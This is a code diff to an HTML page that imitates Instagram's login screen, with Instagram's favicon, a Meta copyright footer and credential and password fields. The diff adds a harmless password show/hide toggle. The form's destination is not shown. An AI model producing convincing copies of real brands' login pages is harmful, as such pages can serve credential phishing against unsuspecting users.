@@ -6,6 +6,7 @@
     <title>Instagram</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 </head>
 <body>
     <div class="container">
@@ -17,8 +18,11 @@
                 <div class="field">
                     <input type="text" name="credential" placeholder="Phone number or email" required>
                 </div>
-                <div class="field">
-                    <input type="password" name="password" placeholder="Password" required>
+                <div class="field password-field">
+                    <input type="password" name="password" id="password" placeholder="Password" required>
+                    <span class="password-toggle" onclick="togglePassword()">
+                        <i class="fa fa-eye-slash" id="toggleIcon"></i>
+                    </span>
                 </div>
                 <button class="login-button" type="submit">Log In</button>
                 <div class="separator">
@@ -71,5 +75,22 @@
             <span>© 2023 Instagram from Meta</span>
         </div>
     </footer>
+
+    <script>
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const toggleIcon = document.getElementById('toggleIcon');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            }
+        }
+    </script>
 </body>
 </html> 
